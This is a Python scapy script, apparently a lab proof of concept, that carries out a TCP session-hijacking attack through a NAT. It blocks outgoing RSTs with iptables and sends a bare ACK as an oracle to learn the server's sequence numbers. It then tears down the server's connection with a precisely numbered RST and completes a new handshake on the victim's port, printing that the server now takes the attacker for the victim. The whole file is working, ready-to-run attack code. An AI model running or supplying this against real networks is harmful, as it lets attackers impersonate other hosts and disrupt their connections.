import sys, os, time, random
from scapy.all import IP, TCP, send, sniff, AsyncSniffer, conf
conf.verb = 0

port = int(sys.argv[1])
SERVER_IP = "20.0.0.20"
SERVER_PORT = 8080

os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {SERVER_IP} -j DROP")

print("[*] CLOSE_WAIT Attack v3: ACK oracle + precise RST + port grab")
print(f"[*] Target port: {port}")

print("[*] Step 1: Waiting 65s for NAT CLOSE_WAIT mapping to expire...")
time.sleep(65)
print("[+] Mapping should be expired")

print("[*] Step 2: Sending bare ACK to trigger corrective ACK from server")
result = {}
def handle(pkt):
    if TCP in pkt:
        result['seq'] = pkt[TCP].seq
        result['ack'] = pkt[TCP].ack

sniffer = AsyncSniffer(filter=f"tcp and src host {SERVER_IP} and dst port {port}",
                        prn=handle, store=False)
sniffer.start()
time.sleep(0.5)

fake_seq = random.randint(100000, 3000000000)
fake_ack = random.randint(100000, 3000000000)
send(IP(dst=SERVER_IP)/TCP(sport=port, dport=SERVER_PORT, flags="A",
     seq=fake_seq, ack=fake_ack))
print("[+] ACK sent, waiting for corrective ACK...")

time.sleep(2)
sniffer.stop()

if 'ack' not in result:
    print("[-] No response from server")
    os.system("iptables -F OUTPUT 2>/dev/null")
    sys.exit(1)

print(f"[+] Corrective ACK received! Server seq={result['seq']} ack={result['ack']}")

print("[*] Step 3: Sending precise RST to kill server's FIN_WAIT_2 PCB")
send(IP(dst=SERVER_IP)/TCP(sport=port, dport=SERVER_PORT, flags="R",
     seq=result['ack']), count=2)
time.sleep(0.5)
print(f"[+] RST sent with seq={result['ack']} - server PCB should be dead")

print("[*] Step 4: Waiting 15s for conntrack CLOSE entry to expire...")
time.sleep(15)

print("[*] Step 5: Sending SYN to grab port")
syn_seq = random.randint(100000, 3000000000)
sniffer2_result = {}
def handle2(pkt):
    if TCP in pkt:
        sniffer2_result['flags'] = pkt[TCP].flags
        sniffer2_result['seq'] = pkt[TCP].seq
        sniffer2_result['ack'] = pkt[TCP].ack

sniffer2 = AsyncSniffer(filter=f"tcp and src host {SERVER_IP} and dst port {port}",
                         prn=handle2, store=False)
sniffer2.start()
time.sleep(0.5)

send(IP(dst=SERVER_IP)/TCP(sport=port, dport=SERVER_PORT, flags="S",
     seq=syn_seq))
print("[+] SYN sent, waiting for SYN-ACK...")

time.sleep(3)
sniffer2.stop()

if 'flags' in sniffer2_result and sniffer2_result['flags'] & 0x12 == 0x12:
    print(f"[+] SYN-ACK received! SEQ={sniffer2_result['seq']} ACK={sniffer2_result['ack']}")

    print("[*] Step 6: Completing 3-way handshake...")
    send(IP(dst=SERVER_IP)/TCP(sport=port, dport=SERVER_PORT, flags="A",
         seq=sniffer2_result['ack'], ack=sniffer2_result['seq']+1))
    print("[+] Final ACK sent - handshake complete!")
    print("[+] ATTACK SUCCESS - CLOSE_WAIT hijacked via ACK oracle + RST")
    print("[+] Server thinks attacker is the victim")
    print("[+] Check server-B - it should show a NEW connection from 20.0.0.1")
    time.sleep(5)
    os.system("iptables -F OUTPUT 2>/dev/null")
    sys.exit(0)
print("[-] No SYN-ACK received")
os.system("iptables -F OUTPUT 2>/dev/null")